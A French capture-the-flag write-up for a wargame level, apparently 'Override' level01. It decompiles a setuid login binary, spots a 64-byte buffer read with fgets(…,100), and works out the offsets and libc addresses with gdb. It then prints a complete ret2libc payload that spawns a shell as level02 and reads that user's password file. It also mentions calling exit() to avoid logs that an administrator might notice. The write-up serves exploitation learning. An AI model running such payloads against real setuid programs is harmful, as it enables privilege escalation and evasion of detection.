Je commence par analyser mon environnement :

```
$ id && pwd && ls -la
uid=1001(level01) gid=1001(level01) groups=1001(level01),100(users)
/home/users/level01
total 17
dr-xr-x---+ 1 level01 level01   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level01 level01  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level01 level01 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level02 users   7360 Sep 10  2016 level01
-rw-r--r--+ 1 level01 level01   41 Oct 19  2016 .pass
-rw-r--r--  1 level01 level01  675 Sep 10  2016 .profile
```

Je trouve un binaire `level01`, que je tente d'éxecuter :

```
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: pomme
verifying username....

nope, incorrect username...

```

Je tente de décompiler le binaire avec [Dogbolt](https://dogbolt.org/?id=9d6ffadf-606a-453b-98f3-bd2653ca19f0#Hex-Rays=120) :

```c

char a_user_name[100]; // idb

int verify_user_name()
{
  puts("verifying username....\n");
  return memcmp(a_user_name, "dat_wil", 7u);
}

int verify_user_pass(const void *a1)
{
  return memcmp(a1, "admin", 5u);
}

int main(int argc, const char **argv)
{
  char string[64]; // [esp+1Ch] [ebp-4Ch] BYREF
  int boolean; // [esp+5Ch] [ebp-Ch]

  memset(string, 0, sizeof(s));
  boolean = 0;
  puts("********* ADMIN LOGIN PROMPT *********");
  printf("Enter Username: ");
  fgets(a_user_name, 256, stdin);
  boolean = verify_user_name();
  if ( boolean != 0 )
  {
    puts("nope, incorrect username...\n");
  }
  else
  {
    puts("Enter Password: ");
    fgets(string, 100, stdin);
    boolean = verify_user_pass(s);
    puts("nope, incorrect password...\n");
  }
  return 1;
}
```

En me basant sur la décompilation des deux fonctions `verify_user_name()` et `verify_user_pass()`, tout semble indiquer que le user_name doit être `dat_wil` et le mot de passe `admin`.

Naturellement, j'essaye :

```
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
admin
nope, incorrect password...

```

Sans succès, je retourne sur le code décompilé et réalise que de toute manière, le code ne fait rien et ne peut que fail. Il me faut en fait exploiter une vulnérabilité afin de lancer du code arbitraire.

En analysant le retour de `Dogbolt` je note l'incohérence suivante :

```c
char string[64];
...
memset(string, 0, sizeof(s));
...
fgets(string, 100, stdin);
```

Ici, 64 bytes sont alloués à `string` mais `fgets()` va en écrire 100.
Cela représente donc un buffer overflow, que je vais pouvoir exploiter avec une technique similaire utilisée dans le projet `Rainfall` appellée `Ret2Libc` (voir [ici](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)).

Cela implique d'overflow le buffer ici afin de ré-écrire la mémoire adjacente, et donc de la stack, et lui faire appeller des adresses de la `libc`, ici, spécifiquement celle de la fonction `system()` laquelle recevra l'argument `/bin/sh`. 

Pour utiliser cet exploit, je dois commencer par trouver de combien de bytes le buffer doit il overflow pour atteindre l'adresse de retour de `main()` afin de la remplacer par l'adresse de `system()`.

Pour cela, j'utilise `gdb` :

```
$ gdb ./level01 -q
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.

(gdb) disas main
Dump of assembler code for function main:
   0x080484d0 <+0>:     push   %ebp
   0x080484d1 <+1>:     mov    %esp,%ebp
   0x080484d3 <+3>:     push   %edi
   0x080484d4 <+4>:     push   %ebx
   0x080484d5 <+5>:     and    $0xfffffff0,%esp
   0x080484d8 <+8>:     sub    $0x60,%esp
   0x080484db <+11>:    lea    0x1c(%esp),%ebx
```

J'observe ici, après les instructions prologue (`push` & `mov`), qu'il y a d'abord un 'alignement' de la mémoire par l'instruction `and`, puis l'instruction `sub` soustrait `0x60 = 96` bytes à `esp`. Cela représente une allocation de 96 bytes sur la stack. Ensuite, l'adresse `ebx` se voit pointer vers `0x1c(esp)` ce qui correspond dans la décompilation par `Dogbolt` a :

```c
char string[64]; // [esp+1Ch] [ebp-4Ch] BYREF
```

Cela m'indique que le buffer commence `0x1c` (= 28) bytes plus loin que `esp`, donc je peux soustraire 28 bytes au 96 alloués et je trouve 68 bytes, ce qui correspond à l'espace alloué à ce buffer (64 + 4 bytes pour l'int `boolean` qui le suit).

Une fois ces 68 bytes "rempli", nous aurons donc "remonté" la stack (puisque le buffer) se trouvait à `ebp` - 96 bytes + 28 bytes. Ecrire 4 bytes plus loin reviendrait donc à ré-écrire sur la mémoire où est sauvegardé l'adresse de `ebp` (la toute première instruction `push   %ebp`, qui représente le début de cette fonction), et les 4 prochains bytes écrirait donc sur ce qui s'appelle la `return address`, qui est un pointeur sur la fonction qui a appelé celle-ci.

En bref : si je créé un payload infecté qui contient 68 bytes + 4 bytes + 4 bytes de n'importe quoi, puis j'écris enfin quelque chose de tangible, tel une adresse vers une fonction qui m'intéresse, alors, j'aurais ré-écris sur la valeur de la `return address`, et a la fin de l'exécution de `main()`, le binaire va lire la `return address` (que j'aurais ré-écrite) et l'appeller.

Je vais donc créé un payload avec la structure suivante :

```
padding + adresse de system() + adresse de exit() + adresse de "/bin/sh"
```

J'inclus l'adresse de `exit()` après celle de `system()` afin que le binaire s'exit sans crash. Cette étape est optionnelle mais évite que cela soit loggé par le système et que l'exploit soit reperé par un administrateur, par exemple.

Pour trouver l'adresse de `exit()`, `system()` et `/bin/sh`, j'utilise `gdb` :

```
$ gdb ./level01 -q
(gdb) b main
Breakpoint 1 at 0x80484d5

(gdb) r
Starting program: /home/users/level01/level01

Breakpoint 1, 0x080484d5 in main ()

(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system <----------------------- ici
0xf7f48a50  svcerr_systemerr

(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xf7e5eb70  exit <------------------------- ici
0xf7e5eba0  on_exit
...

(gdb) info proc mappings
process 1824
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
         0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so <--- libc
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so <--- end
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fda000 0xf7fdb000     0x1000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]

(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

Avec ces 3 adresses, je peux construire mon payload :

```python
python -c 'print("dat_wil"); print("\x90"*76+"\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])'
```

J'inclus le bon username (`dat_wil`) afin de passer le premier if, ainsi que les 3 adresses récupérées plus haut, que j'inverse en Python pour respecter la structure endian de la mémoire.

(`gdb` me les display en Big Endian, mais l'architecture ici nécessite des Small Endian)

J'essaye mon payload :

```
$ (python -c 'print("dat_wil"); print("\x90"*76+"\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

```

Sans succès, j'analyse à nouveau mon procédé et note ma remarque sur :

```
0x080484d5 <+5>:     and    $0xfffffff0,%esp
```

Qui aligne la mémoire sur 16 bytes après le "prologue". Mon padding de 76 bytes n'étant pas un multiple de 16, il est fort possible que je sois désaligné avec le réel emplacement de `ebp`. En effet, l'allocation de mémoire est faite après cet alignement, je tente donc d'arrondir 76 au multiple de 16 le plus proche : 80.

Je retente :

```
$ (python -c 'print("dat_wil"); print("\x90"*80+"\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

Et je récupère correctement le flag.